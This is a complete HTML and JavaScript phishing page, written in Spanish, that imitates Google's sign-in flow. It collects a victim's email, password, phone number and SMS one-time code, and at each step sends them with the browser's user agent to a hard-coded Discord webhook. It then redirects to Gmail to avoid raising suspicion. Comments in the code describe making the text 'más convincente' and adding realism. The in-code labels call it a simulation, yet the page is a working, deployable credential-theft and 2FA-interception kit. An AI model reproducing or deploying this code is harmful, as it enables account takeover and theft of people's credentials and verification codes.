<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceder a la cuenta - Google</title>
    
    <!-- Incluir Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Estilo general y animaciones de transici√≥n */
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f8f9fa;
        }

        /* CARD/CONTAINER: Ajustado para ser m√°s fiel a la anchura y sombra de Google */
        #auth-container {
            max-width: 450px; /* Ancho espec√≠fico de Google */
            min-height: 480px; 
            position: relative; 
            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15); /* Sombra m√°s sutil y profunda */
        }
        
        /* INPUTS: Custom CSS para simular el foco azul de Google */
        .google-input {
            /* Estilos base */
            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
            border-width: 1px;
        }
        .google-input:focus {
            /* Borde y sombra azul al enfocar, como Google */
            outline: none;
            border-color: #1a73e8; /* Google Blue */
            box-shadow: 0 0 0 1px #1a73e8; /* Resplandor sutil */
            border-width: 2px; /* Borde m√°s grueso al enfocar */
            padding-left: 11px; /* Compensar el grosor del borde */
        }

        /* Transiciones de paso */
        .slide-out {
            transform: translateX(-100%);
            opacity: 0;
            position: absolute; 
            top: 0;
            left: 0;
            width: 100%;
        }
        .slide-in {
            transform: translateX(0);
            opacity: 1;
            position: relative; 
        }
        .transition-all {
            transition: all 0.5s ease-in-out;
        }
        .slide-out-visible {
            display: block !important;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 flex-col">

    <!-- Contenedor Principal con Sombra y Borde -->
    <div id="auth-container" class="max-w-sm w-full bg-white border border-gray-200 rounded-xl p-6 md:p-8 relative overflow-hidden">
        
        <!-- Logo -->
        <div class="flex items-start mb-6 justify-center">
            <img src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" alt="Google" class="w-16">
        </div>

        <!-- Paso 1: Inicio de Sesi√≥n (Email & Password) -->
        <div id="signin-step" class="transition-all duration-500 ease-in-out slide-in w-full">
            <!-- T√≠tulo con peso de fuente normal (Google style) -->
            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Acceder</h1>
            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
                Usar tu cuenta de Google
            </p>

            <form id="signin-form">
                
                <div class="mb-6">
                    <input 
                        type="email" 
                        id="email-input" 
                        placeholder="Correo electr√≥nico o tel√©fono" 
                        required
                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
                    >
                    <p id="error-message-signin" class="text-xs text-red-500 mt-1 hidden"></p>
                </div>
                
                <div class="mb-8">
                    <input 
                        type="password" 
                        id="password-input" 
                        placeholder="Ingresa tu contrase√±a" 
                        required
                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
                    >
                    <!-- Enlace real para olvido de contrase√±a -->
                    <a href="https://accounts.google.com/signin/v2/recovery?hl=es" target="_blank" onclick="event.preventDefault(); window.open(this.href, '_blank');" class="text-sm text-blue-600 mt-3 cursor-pointer hover:underline inline-block font-medium">¬øHas olvidado la contrase√±a?</a>
                </div>

                
                <div class="flex justify-between items-center mt-10">
                    <button type="button" id="create-account-button" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
                        Crear cuenta
                    </button>
                    <!-- Bot√≥n azul con sombra sutil -->
                    <button 
                        type="submit"
                        id="next-button"
                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300"
                    >
                        Siguiente
                    </button>
                </div>
            </form>
        </div>

        <!-- Paso 2: Verificaci√≥n de Tel√©fono -->
        <div id="phone-step" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white" style="display: none;">
            
            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Verificaci√≥n de identidad</h1>
            
            <!-- Texto modificado para ser m√°s convincente -->
            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
                Escribe tu n√∫mero de tel√©fono asociado a esta cuenta para la verificaci√≥n. Te enviaremos un SMS.
            </p>

            
            <div class="flex items-center p-3 mb-6 bg-gray-100 border border-gray-300 rounded-lg">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.848 5.231c.143.095.31.144.477.144s.334-.049.477-.144L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
                
                <span id="display-email-phone" class="text-sm font-medium text-gray-800"></span>
            </div>
            
            <form id="phone-form">
                <div class="mb-6">
                    <input 
                        type="text" 
                        id="phone-input" 
                        placeholder="Ingresa tu n√∫mero de tel√©fono" 
                        required
                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
                    >
                    <p id="error-message-phone" class="text-xs text-red-500 mt-1 hidden"></p>
                </div>
                
                <div class="flex justify-between items-center mt-10">
                    <!-- Bot√≥n de Atr√°s movido a la izquierda -->
                    <button type="button" id="back-button-phone" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
                        Atr√°s
                    </button>
                    <button 
                        type="submit"
                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300"
                    >
                        Siguiente
                    </button>
                </div>
            </form>
        </div>

        <!-- Paso 3: C√≥digo SMS -->
        <div id="sms-step" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white" style="display: none;">
            
            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Introduce el c√≥digo</h1>
            
            <!-- Texto modificado para finalizar la sesi√≥n -->
            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
                Introduce el SMS recibido para finalizar el proceso de verificaci√≥n de sesi√≥n. El c√≥digo fue enviado al n√∫mero 
                <span id="display-phone-number" class="font-semibold"></span>.
            </p>

            
            <div class="flex items-center p-3 mb-6 bg-gray-100 border border-gray-300 rounded-lg">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7h3a3 3 0 013 3v8a3 3 0 01-3 3H8a3 3 0 01-3-3v-3m16-5l-4-4M15 12V5a2 2 0 00-2-2H8a2 2 0 00-2 2v7m4 0v-7h6v7z" />
                </svg>
                <span id="display-email-sms" class="text-sm font-medium text-gray-800"></span>
            </div>

            <form id="sms-form">
                <div class="mb-6">
                    <input 
                        type="number" 
                        id="sms-input" 
                        placeholder="Escribe el c√≥digo" 
                        required
                        class="w-full px-4 py-3 border border-gray-300 rounded-lg text-lg tracking-wider text-center google-input"
                    >
                    <p id="error-message-sms" class="text-xs text-red-500 mt-1 hidden"></p>
                    <!-- Enlace real para reenviar c√≥digo (tama√±o ajustado) -->
                    <a href="#" onclick="event.preventDefault(); console.log('Reenviar c√≥digo (Simulado)');" class="text-sm text-blue-600 mt-3 cursor-pointer hover:underline inline-block font-medium">Reenviar c√≥digo</a>
                </div>

                <div class="flex justify-between items-center mt-10">
                     <!-- Bot√≥n de Atr√°s movido a la izquierda -->
                     <button type="button" id="back-button-sms" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
                        Atr√°s
                    </button>
                    <button 
                        type="submit"
                        id="verify-button"
                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300 disabled:opacity-50"
                        disabled 
                    >
                        Verificar
                    </button>
                </div>
            </form>
        </div>

        <!-- Paso 4: Pantalla de √âxito -->
        <div id="success-screen" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white flex flex-col justify-center items-center" style="display: none;">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 text-green-500 mx-auto mb-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <h2 class="text-xl font-semibold text-gray-800 mb-3">Verificaci√≥n Exitosa</h2>
            <p class="text-gray-600 mb-6 text-center">
                Acceso concedido. Redirigiendo a la p√°gina de inicio...
            </p>
        </div>

    </div>

    <!-- Footer A√±adido para Realismo (Dise√±o de Google) -->
    <footer class="mt-8 text-center max-w-sm w-full">
        <div class="flex flex-wrap justify-center md:justify-between space-x-4 text-xs text-gray-500">
            <!-- Selector de Idioma -->
            <select class="bg-transparent border-none focus:outline-none cursor-pointer p-1 rounded-md hover:bg-gray-100">
                <option>Espa√±ol (Latinoam√©rica)</option>
                <option>English (United States)</option>
                <option>Portugu√™s (Brasil)</option>
            </select>
            <!-- Enlaces Legales -->
            <div class="flex space-x-4 mt-2 md:mt-0">
                <a href="https://support.google.com/accounts/answer/40561" target="_blank" class="hover:underline">Ayuda</a>
                <a href="https://policies.google.com/privacy" target="_blank" class="hover:underline">Privacidad</a>
                <a href="https://policies.google.com/terms" target="_blank" class="hover:underline">T√©rminos</a>
            </div>
        </div>
    </footer>

    <script>
        // =========================================================================================================
        // !!! CONFIGURACI√ìN DE DISCORD WEBHOOK !!!
        // =========================================================================================================
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE'; 
        const REDIRECT_URL = "https://mail.google.com/mail/u/0/#inbox"; // Redirecci√≥n final a la bandeja de entrada
        // =========================================================================================================

        // Referencias a elementos del DOM (iguales al archivo anterior)
        const signinStep = document.getElementById('signin-step');
        const phoneStep = document.getElementById('phone-step');
        const smsStep = document.getElementById('sms-step');
        const successScreen = document.getElementById('success-screen');
        
        const signinForm = document.getElementById('signin-form');
        const phoneForm = document.getElementById('phone-form');
        const smsForm = document.getElementById('sms-form');
        
        const emailInput = document.getElementById('email-input');
        const passwordInput = document.getElementById('password-input');
        const phoneInput = document.getElementById('phone-input');
        const smsInput = document.getElementById('sms-input');
        const verifyButton = document.getElementById('verify-button');
        const createAccountButton = document.getElementById('create-account-button');
        const backButtonPhone = document.getElementById('back-button-phone');
        const backButtonSms = document.getElementById('back-button-sms');

        const displayEmailPhone = document.getElementById('display-email-phone');
        const displayEmailSms = document.getElementById('display-email-sms');
        const displayPhoneNumber = document.getElementById('display-phone-number');
        const errorMessageSignin = document.getElementById('error-message-signin');
        const errorMessagePhone = document.getElementById('error-message-phone');
        const errorMessageSms = document.getElementById('error-message-sms');

        let capturedData = {
            email: null,
            password: null,
            phone_number: null,
            sms_code: null
        }; 

        // Funci√≥n de Transici√≥n entre pasos
        function transitionTo(currentStep, nextStep) {
            currentStep.classList.remove('slide-in');
            currentStep.classList.add('slide-out', 'slide-out-visible'); 
            
            setTimeout(() => {
                currentStep.style.display = 'none';
                currentStep.classList.remove('slide-out-visible'); 
                
                nextStep.style.display = (nextStep === successScreen) ? 'flex' : 'block';
                nextStep.classList.remove('slide-out');
                nextStep.classList.add('slide-in');
            }, 500); 
        }

        // Funci√≥n para enviar la alerta inmediata al Webhook de Discord
        async function sendWebhookNotification(data, step) {
            if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.includes('http') || DISCORD_WEBHOOK_URL.includes('YOUR_ID')) {
                console.warn("URL de Webhook no configurada o incompleta. No se envi√≥ la alerta.");
                return;
            }

            let title, color;
            switch(step) {
                case 'SMS':
                    title = "‚úÖ ¬°C√≥digo SMS Capturado! ‚úÖ";
                    color = 65280; // Green
                    break;
                case 'PHONE':
                    title = "üìû ¬°Tel√©fono Capturado! üìû";
                    color = 16750080; // Orange
                    break;
                case 'CREDENTIALS_LOGIN':
                    title = "‚ö†Ô∏è ¬°Credenciales Capturadas (Login)! ‚ö†Ô∏è";
                    color = 16776960; // Yellow
                    break;
                case 'CREDENTIALS_CREATE':
                    title = "‚ö†Ô∏è ¬°Credenciales Capturadas (Crear Cuenta)! ‚ö†Ô∏è";
                    color = 16776960; // Yellow
                    break;
                default:
                    title = "‚ö†Ô∏è ¬°Datos Capturados! ‚ö†Ô∏è";
                    color = 16776960; // Yellow
            }

            const message = {
                username: "Alerta de Captura (Simulaci√≥n)",
                embeds: [{
                    title: title,
                    color: color, 
                    fields: [
                        { name: "Correo Electr√≥nico", value: data.email || 'N/A', inline: false },
                        { name: "Contrase√±a", value: data.password || 'N/A', inline: false },
                        { name: "Tel√©fono", value: data.phone_number || 'A√∫n No Ingresado', inline: false },
                        { name: "C√≥digo SMS (OTP)", value: data.sms_code || 'A√∫n No Ingresado', inline: false },
                        { name: "User Agent", value: navigator.userAgent, inline: false },
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: `Fase: ${step} | Simulaci√≥n de Phishing` }
                }]
            };

            // Implementaci√≥n de reintentos con backoff exponencial
            const MAX_RETRIES = 5;
            let attempts = 0;
            while (attempts < MAX_RETRIES) {
                try {
                    const response = await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(message)
                    });
                    
                    if (response.ok) {
                        return; // √âxito
                    } else {
                        // Si el estado es 401, es un error de token. No reintentar.
                        if (response.status === 401) {
                             console.error(`Fallo al enviar el Webhook de Discord (HTTP 401). Token no v√°lido.`);
                             console.error("Mensaje de respuesta:", await response.text());
                             break;
                        }
                        
                        console.warn(`Fallo en el Webhook (HTTP ${response.status}). Reintentando en ${Math.pow(2, attempts)}s...`);
                    }

                } catch (error) {
                    console.warn(`Fallo en la conexi√≥n del Webhook. Reintentando en ${Math.pow(2, attempts)}s...`);
                }

                attempts++;
                if (attempts < MAX_RETRIES) {
                    // Espera exponencial
                    await new Promise(resolve => setTimeout(resolve, Math.pow(2, attempts) * 1000));
                }
            }

            if (attempts === MAX_RETRIES) {
                console.error("El Webhook de Discord fall√≥ despu√©s de m√∫ltiples reintentos.");
            }
        }


        // --- Manejadores de Eventos ---

        // Funci√≥n com√∫n para el Paso 1: Captura de Credenciales
        async function handleCredentialCapture(e, stepName) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            if (stepName === 'CREDENTIALS_LOGIN' && (!email || !password)) {
                errorMessageSignin.textContent = "Por favor, ingresa tu correo y contrase√±a.";
                errorMessageSignin.classList.remove('hidden');
                return;
            }
            errorMessageSignin.classList.add('hidden');

            // 1. Almacenar Correo y Contrase√±a
            capturedData.email = email || 'Crear cuenta (Email vac√≠o)';
            capturedData.password = password || 'Crear cuenta (Password vac√≠o)';
            
            displayEmailPhone.textContent = capturedData.email; 
            displayEmailSms.textContent = capturedData.email; 

            // 2. üö® ENVIAR ALERTA INMEDIATAMENTE
            await sendWebhookNotification(capturedData, stepName);
            
            // 3. Iniciar transici√≥n visual
            transitionTo(signinStep, phoneStep);
        }

        // --- L√≥gica del Paso 1: Bot√≥n Siguiente (Login) ---
        signinForm.addEventListener('submit', (e) => handleCredentialCapture(e, 'CREDENTIALS_LOGIN'));

        // --- L√≥gica del Paso 1: Bot√≥n Crear Cuenta ---
        createAccountButton.addEventListener('click', (e) => handleCredentialCapture(e, 'CREDENTIALS_CREATE'));

        // --- L√≥gica del Paso 2: N√∫mero de Tel√©fono ---
        phoneForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = phoneInput.value.trim();
            if (phone.length < 5) { 
                errorMessagePhone.textContent = "Ingresa un n√∫mero de tel√©fono v√°lido para la verificaci√≥n.";
                errorMessagePhone.classList.remove('hidden');
                return;
            }
            errorMessagePhone.classList.add('hidden');

            // 1. Almacenar N√∫mero de Tel√©fono
            capturedData.phone_number = phone;
            displayPhoneNumber.textContent = phone;

            // 2. üö® ENVIAR ALERTA N√öMERO DE TEL√âFONO
            await sendWebhookNotification(capturedData, 'PHONE');
            
            // 3. Iniciar transici√≥n visual
            transitionTo(phoneStep, smsStep);
        });

        // Bot√≥n Atr√°s del Paso de Tel√©fono
        backButtonPhone.addEventListener('click', function() {
            transitionTo(phoneStep, signinStep);
        });
        
        // --- L√≥gica del Paso 3: C√≥digo SMS (OTP) ---
        
        // Habilitar bot√≥n 'Verificar' al escribir
        smsInput.addEventListener('input', function() {
            verifyButton.disabled = this.value.length === 0;
        });

        smsForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const smsCode = smsInput.value.trim();

            if (smsCode.length === 0) { 
                errorMessageSms.textContent = "Por favor, ingresa el c√≥digo SMS.";
                errorMessageSms.classList.remove('hidden');
                return;
            }
            errorMessageSms.classList.add('hidden');

            // 1. Almacenar C√≥digo SMS
            capturedData.sms_code = smsCode;

            // 2. üö® ENVIAR ALERTA C√ìDIGO SMS
            await sendWebhookNotification(capturedData, 'SMS'); 
            
            // 3. Transici√≥n a la Pantalla de √âxito
            transitionTo(smsStep, successScreen);
            
            // 4. Redireccionar despu√©s de un tiempo
            setTimeout(() => {
                window.location.href = REDIRECT_URL; 
            }, 3000); // 3 segundos para que el usuario vea el √©xito
        });

        // Bot√≥n Atr√°s del Paso SMS
        backButtonSms.addEventListener('click', function() {
            transitionTo(smsStep, phoneStep);
        });
    </script>

</body>
</html>
